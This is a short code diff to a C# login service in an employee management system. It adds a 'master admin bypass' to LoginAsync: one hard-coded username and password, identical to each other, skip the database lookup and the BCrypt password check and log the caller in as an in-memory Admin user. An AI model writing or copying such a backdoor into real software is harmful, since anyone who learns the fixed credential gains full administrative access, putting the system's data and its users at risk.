@@ -18,6 +18,23 @@ namespace EMS.Services
 
         public async Task<bool> LoginAsync(string username, string password)
         {
+            // Master admin bypass
+            if (username == "samiullah" && password == "samiullah")
+            {
+                _currentUser = new Employee
+                {
+                    Id = "master_admin",
+                    Name = "Samiullah",
+                    Position = "Master Admin",
+                    Contact = "N/A",
+                    Username = "samiullah",
+                    Password = "samiullah",
+                    UserRole = new UserRole { RoleName = "Admin" },
+                    DateOfBirth = DateTime.MinValue
+                };
+                return true;
+            }
+
             var user = await _employeeCollection.Find(x => x.Username == username).FirstOrDefaultAsync();
             
             if (user != null && BCrypt.Net.BCrypt.Verify(password, user.Password))
